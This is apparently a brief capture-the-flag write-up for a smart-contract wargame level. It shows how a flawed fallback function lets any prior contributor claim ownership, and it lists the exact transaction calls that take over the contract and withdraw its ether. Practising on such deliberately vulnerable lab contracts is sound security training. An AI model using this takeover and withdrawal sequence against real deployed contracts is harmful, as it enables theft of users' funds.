-The fallback() function contained the lined
`if (contributions[msg.sender] > 0) {
    owner = msg.sender;
}
`
-Understood that if we send ether directly to the contract and we alreadty have a contribution, we can become the owner
`
await contract.contribute.sendTransaction({ from: player, value: 1 });
`

-Once we have become the owner, call the withdraw() function and take out all the funds

`
await contract.sendTransaction({ from: player, value: 1 });
`

- Verfied the ownership by
  
`
await contract.owner();
`

- After ownership verification, we can withdraw

`
await contract.withdraw();
`
-Completed the level by submitting the instance
